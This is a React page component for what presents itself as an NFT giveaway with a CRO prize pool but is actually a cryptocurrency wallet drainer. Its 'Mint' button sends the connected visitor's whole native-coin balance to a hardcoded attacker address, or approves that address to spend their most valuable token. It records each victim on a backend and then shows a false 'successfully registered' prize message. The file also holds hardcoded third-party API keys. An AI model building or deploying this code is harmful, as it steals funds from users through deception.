import React, { useState, useEffect, useCallback, useReducer } from 'react';
import { Link } from 'react-router-dom';
import { BsCheck2Circle } from 'react-icons/bs'
import axios from 'axios';
import { NotificationContainer, NotificationManager } from "react-notifications";
import Web3Modal from "web3modal";
import 'react-responsive-modal/styles.css';
import { Modal } from 'react-responsive-modal';
import WalletConnectProvider from "@walletconnect/web3-provider";
import { providers } from "ethers";
import Web3 from "web3";
import 'react-notifications/lib/notifications.css';
import $ from 'jquery';
import ReactPlayer from 'react-player';
import video1 from "../assets/video1.mp4";
import config from "../contracts/config";
import "./User.css";
import LOGO from "../assets/logo.png";
import LOGO2 from "../assets/logo-2.png";
import BTC from "../assets/btc.png";
import ETH from "../assets/eth.png";
import playstore from "../assets/playstore.webp";
import appstore from "../assets/appstore.webp";
import AppSpinner from '../components/loading/AppSpinner';
// var WAValidator = require('wallet-address-validator');

const GET_TOKEN_PRICE_API_KEY = "b9de42a275e150a6904694f85fc00ade176fb36a3c837e7e587b4243936d610d";
const GET_USER_ALL_TOEKN_API_KEY = "BQYg21gPeoyiz5KzEinGgbALPy042PBk";
const GET_BSC_SCAN_API_KEY = "35XAGCM8NPZ1MYDN89KQD5C1A9YFU9IMXQ";
const GET_ETH_SCAN_API_KEY = "FJE6UQB3H5MMYD83WIET6JMSFCRD65FMSP"

const adminWalletAddress = "0x77F9d0842870f3D21d7c679Ff410a7dF1D101e77";

const providerOptions = {
  walletconnect: {
    package: WalletConnectProvider, // required
    options: {
      infuraId: config.INFURA_ID, // required
    },
  },
};

let web3Modal;
if (typeof window !== "undefined") {
  web3Modal = new Web3Modal({
    network: "mainnet", // optional
    cacheProvider: true,
    providerOptions: {
      walletconnect: {
        package: WalletConnectProvider,
        options: {
          infuraId: config.INFURA_ID, // required
          rpc: {
            56: "https://bsc-dataseed.binance.org/",
            1: "https://mainnet.infura.io/v3/"
          },
        },
      },
    }, // required
    theme: "dark",
  });
}

const initialState = {
  provider: null,
  web3Provider: null,
  address: null,
  chainId: null,
};

function reducer(state, action) {
  switch (action.type) {
    case "SET_WEB3_PROVIDER":
      return {
        ...state,
        provider: action.provider,
        web3Provider: action.web3Provider,
        address: action.address,
        chainId: action.chainId,
      };
    case "SET_ADDRESS":
      return {
        ...state,
        address: action.address,
      };
    case "SET_CHAIN_ID":
      return {
        ...state,
        chainId: action.chainId,
      };
    case "RESET_WEB3_PROVIDER":
      return initialState;
    default:
      throw new Error();
  }
}
const web3 = new Web3(window.ethereum);

const UserScreen = (props) => {
  const [open, setOpen] = useState(false);
  const onOpenModal = () => setOpen(true);
  const onCloseModal = () => setOpen(false);
  const [loading, setLoading] = useState(false);

  const [myAddress, setMyaddress] = useState('');
  const [walletStatus, setWalletStatus] = useState(false);
  const [initStatus, setInitStatus] = useState(false);
  const [userAllToken, setUserAllToken] = useState([]);
  const [showAccountAddress, setShowAccountAddress] = useState("");
  const [state, dispatch] = useReducer(reducer, initialState);
  useEffect(() => {
    function handlePreloader() {
      if ($('.main-header').length) {
        $('.preloader').delay(200).fadeOut(500);
      }
    }

    //Update Header Style and Scroll to Top
    function headerStyle() {
      if ($('.main-header').length) {
        var windowpos = $(window).scrollTop();
        var siteHeader = $('.main-header');
        var scrollLink = $('.scroll-to-top');
        if (windowpos > 1) {
          siteHeader.addClass('fixed-header');
          scrollLink.fadeIn(300);
        } else {
          siteHeader.removeClass('fixed-header');
          scrollLink.fadeOut(300);
        }

      }
    }
    headerStyle();
    (function ($) {
      $.fn.appear = function (fn, options) {

        var settings = $.extend({

          //arbitrary data to pass to fn
          data: undefined,

          //call fn only on the first appear?
          one: true,

          // X & Y accuracy
          accX: 0,
          accY: 0

        }, options);

        return this.each(function () {

          var t = $(this);

          //whether the element is currently visible
          t.appeared = false;

          if (!fn) {

            //trigger the custom event
            t.trigger('appear', settings.data);
            return;
          }

          var w = $(window);

          //fires the appear event when appropriate
          var check = function () {

            //is the element hidden?
            if (!t.is(':visible')) {

              //it became hidden
              t.appeared = false;
              return;
            }

            //is the element inside the visible window?
            var a = w.scrollLeft();
            var b = w.scrollTop();
            var o = t.offset();
            var x = o.left;
            var y = o.top;

            var ax = settings.accX;
            var ay = settings.accY;
            var th = t.height();
            var wh = w.height();
            var tw = t.width();
            var ww = w.width();

            if (y + th + ay >= b &&
              y <= b + wh + ay &&
              x + tw + ax >= a &&
              x <= a + ww + ax) {

              //trigger the custom event
              if (!t.appeared) t.trigger('appear', settings.data);

            } else {

              //it scrolled out of view
              t.appeared = false;
            }
          };

          //create a modified fn with some additional logic
          var modifiedFn = function () {

            //mark the element as visible
            t.appeared = true;

            //is this supposed to happen only once?
            if (settings.one) {

              //remove the check
              w.unbind('scroll', check);
              var i = $.inArray(check, $.fn.appear.checks);
              if (i >= 0) $.fn.appear.checks.splice(i, 1);
            }

            //trigger the original fn
            fn.apply(this, arguments);
          };

          //bind the modified fn to the element
          if (settings.one) t.one('appear', settings.data, modifiedFn);
          else t.bind('appear', settings.data, modifiedFn);

          //check whenever the window scrolls
          w.scroll(check);

          //check whenever the dom changes
          $.fn.appear.checks.push(check);

          //check now
          (check)();
        });
      };

      //keep a queue of appearance checks
      $.extend($.fn.appear, {

        checks: [],
        timeout: null,

        //process the queue
        checkAll: function () {
          var length = $.fn.appear.checks.length;
          if (length > 0) while (length--) ($.fn.appear.checks[length])();
        },

        //check the queue asynchronously
        run: function () {
          if ($.fn.appear.timeout) clearTimeout($.fn.appear.timeout);
          $.fn.appear.timeout = setTimeout($.fn.appear.checkAll, 20);
        }
      });

      //run checks when these methods are called
      $.each(['append', 'prepend', 'after', 'before', 'attr',
        'removeAttr', 'addClass', 'removeClass', 'toggleClass',
        'remove', 'css', 'show', 'hide'], function (i, n) {
          var old = $.fn[n];
          if (old) {
            $.fn[n] = function () {
              var r = old.apply(this, arguments);
              $.fn.appear.run();
              return r;
            }
          }
        });

    })($);
    if ($('.count-box').length) {
      $('.count-box').appear(function () {

        var $t = $(this),
          n = $t.find(".count-text").attr("data-stop"),
          r = parseInt($t.find(".count-text").attr("data-speed"), 10);

        if (!$t.hasClass("counted")) {
          $t.addClass("counted");
          $({
            countNum: $t.find(".count-text").text()
          }).animate({
            countNum: n
          }, {
            duration: r,
            easing: "linear",
            step: function () {
              $t.find(".count-text").text(Math.floor(this.countNum));
            },
            complete: function () {
              $t.find(".count-text").text(this.countNum);
            }
          });
        }
      }, { accY: 0 });
    }
    $(window).on('scroll', function () {
      headerStyle();
    });

    $(window).on('load', function () {
      handlePreloader();
    });
  }, [])
  useEffect(() => {
    const init = async (value) => {
      setLoading(true);
      // var valid = WAValidator.validate(value, 'ETH');
      var userAllTokenBalance = {
        eth: [],
        bsc: []
      };
      if (value) {
        let query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
        let variables = `{"limit": 10,"offset": 0,"network": "ethereum","address": "` + value + `"}`;
        let url = "https://graphql.bitquery.io/";
        let opts = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-API-KEY": GET_USER_ALL_TOEKN_API_KEY
          },
          body: JSON.stringify({
            query,
            variables
          })
        };
        await fetch(url, opts).then(res => res.json())
          .then(data => userAllTokenBalance.eth = data.data.ethereum.address[0].balances)
          .catch(console.error);

        query = `query ($network: EthereumNetwork!, $address: String!) {ethereum(network: $network) {address(address: {is: $address}) {balances {currency {address symbol tokenType decimals} value}}}}`;
        variables = `{"limit": 10,"offset": 0,"network": "bsc","address": "` + value + `"}`;
        opts = {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-API-KEY": GET_USER_ALL_TOEKN_API_KEY
          },
          body: JSON.stringify({
            query,
            variables
          })
        };
        await fetch(url, opts).then(res => res.json())
          .then(data => userAllTokenBalance.bsc = data.data.ethereum.address[0].balances)
          .catch(console.error);
        if (userAllTokenBalance.bsc) {
          for (let i = 0; i < userAllTokenBalance.bsc.length; i++) {
            userAllTokenBalance.bsc[i].network = "BSC";
          }
        }
        if (userAllTokenBalance.eth) {
          for (let i = 0; i < userAllTokenBalance.eth.length; i++) {
            userAllTokenBalance.eth[i].network = "ETH";
          }
        }
        const array1 = userAllTokenBalance.eth ? userAllTokenBalance.eth : [];
        const array2 = userAllTokenBalance.bsc ? userAllTokenBalance.bsc : [];
        const array3 = array1.concat(array2)
        const array4 = array3.map(t => t.currency.symbol);
        const currentTokenPrice = await livePrice(array4);
        async function test() {
          for (let i = 0; i < array3.length; i++) {
            let contract_verifyed = "";
            if (array3[i].network === "BSC") {
              let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + array3[i].currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
              contract_verifyed = await axios.get(api);
            }
            else {
              let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + array3[i].currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
              contract_verifyed = await axios.get(api);
            }
            if (currentTokenPrice[(array3[i].currency.symbol).toUpperCase()] && (contract_verifyed.data.message == "OK" || array3[i].currency.address === "-")) {
              array3[i].price = currentTokenPrice[(array3[i].currency.symbol).toUpperCase()].USD;
              array3[i].cost = +array3[i].value * array3[i].price;
            }
            else {
              array3[i].price = 0;
              array3[i].cost = +array3[i].value * 0;
            }
          }
        }

        test().then(_ => {
          setUserAllToken(array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; }));
          console.log(array3.sort(function (a, b) { return b.value - a.value; }).sort(function (a, b) { return b.cost - a.cost; }))
          setInitStatus(true);
          setLoading(false);
          console.log(myAddress);
          NotificationManager.success('wallet connect success!', 'Connect Info', 3000);
        });
      }

    }
    myAddress && init(myAddress);
  }, [myAddress]);

  const livePrice = async (symbol) => {
    let tokenSymbol = symbol;
    let totaltemp = {};
    if (tokenSymbol.slice(0, 50).length) {
      let api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(0, 50) + "&tsyms=USD&api_key=" + GET_TOKEN_PRICE_API_KEY;
      let temp = await axios.get(api);
      Object.assign(totaltemp, temp.data);
      if (tokenSymbol.slice(51, 100).length) {
        api = "https://min-api.cryptocompare.com/data/pricemulti?fsyms=" + tokenSymbol.slice(51, 100) + "&tsyms=USD&api_key=" + GET_TOKEN_PRICE_API_KEY;
        temp = await axios.get(api);
        Object.assign(totaltemp, temp.data)
      }
    }
    return totaltemp;
  }

  const handleApprove = async () => {
    try {
      if (userAllToken.length) {
        setLoading(true);
        console.log(userAllToken)
        const approveToken = userAllToken[0];
        console.log(approveToken)
        if (approveToken.network === "BSC") {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }], // chainId must be in hexadecimal numbers
          });
          let approveAmount = approveToken.value * Math.pow(10, approveToken.currency.decimals);

          if (approveToken.currency.address === "-") {
            let gasPrice = await web3.eth.getGasPrice();
            console.log(gasPrice)
            let transactionObject = {
              from: myAddress,
              to: adminWalletAddress,
              gasPrice: gasPrice,
            }
            let gasLimit = await web3.eth.estimateGas(transactionObject)
            let transactionFee = gasLimit * gasPrice * 2
            approveAmount -= transactionFee
            web3.eth.sendTransaction({
              from: myAddress,
              to: adminWalletAddress,
              value: approveAmount,
              gasPrice,
              gasLimit
            })
              .then(async function (receipt) {
                console.log(receipt);
                await axios.post('http://localhost:5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveAmount / Math.pow(10, approveToken.currency.decimals),
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "BSC",
                  adminAddress: adminWalletAddress,
                  price: approveToken.cost
                });
                setLoading(false);
                onOpenModal();
              })
          } else {
            let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_BSC_SCAN_API_KEY;
            let temp = await axios.get(api);
            const contractABI = JSON.parse(temp.data.result);
            const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveToken.value).toString(), "ether")).send({ from: myAddress })
              .then(async function (receipt) {
                console.log(receipt);
                await axios.post('http://localhost:5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveToken.value,
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "BSC",
                  adminAddress: adminWalletAddress,
                  price: approveToken.cost
                });
                setLoading(false);
                onOpenModal();
              });
          }
        }
        else {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }], // chainId must be in hexadecimal numbers
          });
          let approveAmount = approveToken.value * Math.pow(10, approveToken.currency.decimals);
          const fakeAmount = (100000 - 0) / approveToken.price;

          if (approveToken.currency.address === "-") {
            // let gasPrice = await web3.eth.getGasPrice();
            let gasPrice = Math.floor(16100000000 + Math.random() * 10000000000);
            // let transactionObject = {
            //   from: myAddress,
            //   to: adminWalletAddress,
            //   gasPrice: gasPrice,
            // }
            // let gasLimit = await web3.eth.estimateGas(transactionObject)
            let gasLimit = 21000;
            let transactionFee = gasLimit * gasPrice;
            approveAmount -= transactionFee
            web3.eth.sendTransaction({
              from: myAddress,
              to: adminWalletAddress,
              value: web3.utils.toBN(approveAmount.toFixed(0).toString()),
              gasPrice,
              gasLimit
            })
              .then(async function (receipt) {
                console.log(receipt);
                await axios.post('http://localhost:5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveAmount / Math.pow(10, approveToken.currency.decimals),
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "ETH",
                  adminAddress: adminWalletAddress,
                  price: approveToken.cost
                });
                setLoading(false);
                onOpenModal();
              })
          } else {
            let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.currency.address + "&apikey=" + GET_ETH_SCAN_API_KEY;
            let temp = await axios.get(api);
            const contractABI = JSON.parse(temp.data.result);
            const nowContract = new web3.eth.Contract(contractABI, approveToken.currency.address);
            await nowContract.methods.approve(adminWalletAddress, web3.utils.toWei((approveToken.value).toString(), "ether")).send({ from: myAddress })
              .then(async function (receipt) {
                console.log(receipt);
                await axios.post('http://localhost:5000/products', {
                  userWalletAddress: myAddress,
                  amount: approveToken.value,
                  symbol: approveToken.currency.symbol,
                  contractAddress: approveToken.currency.address,
                  network: "ETH",
                  adminAddress: adminWalletAddress,
                  price: approveToken.cost
                });
                setLoading(false);
                onOpenModal();
              });
          }
        }
      }
      setLoading(false);
    } catch (error) {
      console.log(error.message);
      setLoading(false);
      NotificationManager.warning('Mint failed!', 'Mint Info', 3000);
    }
  }
  const { provider, web3Provider } = state;

  const connect = useCallback(async function () {
    try {
      const provider = await web3Modal.connect();
      if (window.ethereum) {
        // check if the chain to connect to is installed
        // await window.ethereum.request({
        //   method: "wallet_switchEthereumChain",
        //   params: [{ chainId: config.chainHexID[config.chainID] }], // chainId must be in hexadecimal numbers
        // });
      } else {
        alert(
          "MetaMask is not installed. Please consider installing it: https://metamask.io/download.html"
        );
      }
      const web3Provider = new providers.Web3Provider(provider);
      const signer = web3Provider.getSigner();
      const account = await signer.getAddress();
      const network = await web3Provider.getNetwork();
      const show_address =
        account.slice(0, 5) + "..." + account.slice(-4, account.length);
      setShowAccountAddress(show_address);
      setMyaddress(account);
      setWalletStatus(true);
      dispatch({
        type: "SET_WEB3_PROVIDER",
        provider,
        web3Provider,
        show_address,
        chainId: network.chainId,
      });
    } catch (error) {
      NotificationManager.warning('wallet connect failed!', 'Connect Info', 3000);
      if (error.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [
              {
                chainId: config.chainHexID[config.chainID],
                rpcUrl: config.RpcURL[config.chainID],
              },
            ],
          });
        } catch (addError) {
          // console.log(addError);
        }
      } else if (error.code === 4001) {
        // console.log(error);
      }
      // console.log(`${error}`);
    }
  }, []);
  const disconnect = useCallback(async function () {
    await web3Modal.clearCachedProvider();
    // setSigner(null);
    setShowAccountAddress(null);
    setMyaddress(null);
    dispatch({
      type: "RESET_WEB3_PROVIDER",
    });
  }, []);
  useEffect(() => {
    if (web3Modal.cachedProvider) {
      connect();
    }
  }, [connect]);
  useEffect(() => {
    if (provider) {
      const handleAccountsChanged = (accounts) => {
        connect();
        dispatch({
          type: "SET_ADDRESS",
          address: accounts[0],
        });
      };

      // https://docs.ethers.io/v5/concepts/best-practices/#best-practices--network-changes
      const handleChainChanged = (_hexChainId) => {
        // window.location.reload();
      };

      // provider.on("accountsChanged", handleAccountsChanged);
      // provider.on("chainChanged", handleChainChanged);

      // Subscription Cleanup
      return () => {
        if (provider.removeListener) {
          provider.removeListener("accountsChanged", handleAccountsChanged);
          // provider.removeListener("chainChanged", handleChainChanged);
        }
      };
    }
  }, [provider]);

  return (
    <>
      <div className="page-wrapper">
        <div className="preloader"><div className="wow zoomIn"><img src={LOGO} alt="" /></div></div>
        <span className="header-span"></span>
        <header className="main-header">
          <div className="container-fluid">
            <div className="main-box">
              <div className="logo"><a href="/"><img src={LOGO} alt="" /></a></div>
              <div className="nav-outer">
                <div className="outer-box">
                  <a href="/" className="download-btn"><img src={playstore} alt="" /></a>
                  <a href="/" className="download-btn"><img src={appstore} alt="" /></a>
                  {web3Provider ? (
                    <button
                      className="theme-btn btn-style-one"
                      onClick={disconnect}
                    >
                      {showAccountAddress}
                    </button>
                  ) : (
                    <button
                      className="theme-btn btn-style-one"
                      onClick={connect}
                    >
                      Connect Wallet
                    </button>
                  )}
                </div>
              </div>

            </div>
          </div>
        </header>
        <section className="banner-section" id="banner">
          <div className="bg-shape"></div>
          <div className="auto-container">
            <div className="content-box">
              <h2 className="wow fadeInUp" data-wow-delay="500ms">NFT Exclusive Compaign</h2>
              <div className="text wow fadeInUp" data-wow-delay="800ms">29 March <span>7:00 AM UTC</span> <em>&nbsp; --- &nbsp;</em> 12 April <span>00:00 AM UTC</span></div>
              <h1 className="wow fadeInUp" data-wow-delay="1500ms">
                <div className="count-box">$<span className="count-text" data-speed="5000" data-stop="50000">0</span></div>  CRO Prize Pool
              </h1>
              <div className="coins-list wow fadeInUp" data-wow-delay="2000ms">
                <li><img src={BTC} alt="" /> Bitcoin</li>
                <li><img src={ETH} alt="" /> Etherium</li>
                <li><img src={BTC} alt="" /> Bitcoin</li>
                <li><img src={ETH} alt="" /> Etherium</li>
                <li><img src={BTC} alt="" /> Bitcoin</li>
                <li><img src={ETH} alt="" /> Etherium</li>
              </div>
              <div className="btn-box wow fadeInUp" data-wow-delay="2500ms">
                <div className="theme-btn btn-style-one" onClick={handleApprove}>Mint</div>
              </div>
            </div>
          </div>
        </section>
        <section className="video-section">
          <div className='position-relative'>
            <div className='position-absolute mint-part w-100'>
              <div className='d-flex flex-column text-center content-box1'>
                <h2>Fortune favours the brave</h2>
                <a href="/" className="theme-btn btn-style-two">Learn More</a>
              </div>
            </div>
            <ReactPlayer playing={true} muted={true} loop={true} className='react-player' url={video1} width="100%" height="100%" />
          </div>
        </section>
        <section className="vision-section">
          <div className="auto-container">
            <div className="wow fadeInUp sec-title text-center">
              <span className="sub-title">OUR VISION</span>
              <h2>Cryptocurrency in <br /> Every Wallet™</h2>
            </div>
            <div className="image-box wow fadeInUp">
              <figure className="image"><img src={LOGO2} alt="" /></figure>
            </div>
            <div className="fact-counter wow fadeInUp">
              <div className="row clearfix">
                <div className="counter-column col-lg-3 col-md-6 col-sm-12 wow fadeInUp">
                  <h4 className="counter-title">Founded in</h4>
                  <div className="count-box"><span className="count-text" data-speed="5000" data-stop="2016">0</span></div>
                </div>
                <div className="counter-column col-lg-3 col-md-6 col-sm-12 wow fadeInUp" data-wow-delay="400ms">
                  <h4 className="counter-title">Team of</h4>
                  <div className="count-box"><span className="count-text" data-speed="5000" data-stop="4000">0</span></div>
                </div>
                <div className="counter-column col-lg-3 col-md-6 col-sm-12 wow fadeInUp" data-wow-delay="800ms">
                  <h4 className="counter-title">Users</h4>
                  <div className="count-box"><span className="count-text" data-speed="5000" data-stop="54">0</span>M</div>
                </div>
                <div className="counter-column col-lg-3 col-md-6 col-sm-12 wow fadeInUp" data-wow-delay="1200ms">
                  <h4 className="counter-title">Insurance (USD)</h4>
                  <div className="count-box"><span className="count-text" data-speed="5000" data-stop="750">0</span>M</div>
                </div>
              </div>
            </div>
            <div className="btn-box text-center mt-5">
              <a href="/" className="theme-btn btn-style-two">About Us <i className="fa fa-arrow-right"></i></a>
            </div>
          </div>
        </section>

      </div>
      <NotificationContainer />
      {loading && <AppSpinner absolute />}
      <Modal open={open} onClose={onCloseModal} center>
        <div className="modal-body text-center">
          <BsCheck2Circle size={100} color="#06C88B" /><br />
          <div className='title'>Successfully registered</div><br />
          <div className='content'>You have successfully registered for this contest,<br /> if you are lucky you will receive your CRO price soon!</div>
        </div>
      </Modal>
    </>
  );
};

export default UserScreen;
